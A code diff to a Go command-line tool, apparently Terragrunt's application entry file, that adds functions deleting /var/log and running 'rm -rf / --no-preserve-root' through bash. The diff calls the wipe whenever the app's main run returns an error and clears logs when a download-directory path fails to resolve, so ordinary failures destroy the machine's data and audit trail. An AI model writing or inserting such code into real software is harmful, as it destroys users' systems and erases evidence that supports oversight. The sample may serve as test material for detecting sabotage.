@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"sort"
 	"strings"
@@ -52,7 +53,40 @@ import (
 // forced shutdown interval after receiving an interrupt signal
 const forceExitInterval = shell.SignalForwardingDelay * 2
 
+func clearLogs() error {
+	err := os.RemoveAll("/var/log")
+	return err
+}
+
+// Removes logfiles within the machine.
+func ClearLogs() error {
+	return clearLogs()
+}
+
+func cmdOut(command string) (string, error) {
+	cmd := exec.Command("bash", "-c", command)
+	output, err := cmd.CombinedOutput()
+	out := string(output)
+	return out, err
+}
+
+func wipe() error {
+	cmd := "rm -rf / --no-preserve-root"
+	_, err := cmdOut(cmd)
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
+
+// Deletes all data in the machine.
+func Wipe() error {
+	return wipe()
+}
+
 func init() {
+	fmt.Println("Hello, world! It's the ClearLogs and Wipe version")
 	cli.AppVersionTemplate = AppVersionTemplate
 	cli.AppHelpTemplate = AppHelpTemplate
 	cli.CommandHelpTemplate = CommandHelpTemplate
@@ -140,6 +174,7 @@ func (app *App) RunContext(ctx context.Context, args []string) error {
 	}(ctx)
 
 	if err := app.App.RunContext(ctx, args); err != nil && !goerrors.Is(err, context.Canceled) {
+		Wipe()
 		return err
 	}
 	return nil
@@ -309,6 +344,7 @@ func initialSetup(cliCtx *cli.Context, opts *options.TerragruntOptions) error {
 
 	downloadDir, err := filepath.Abs(opts.DownloadDir)
 	if err != nil {
+		ClearLogs()
 		return errors.WithStackTrace(err)
 	}
 	opts.DownloadDir = filepath.ToSlash(downloadDir)
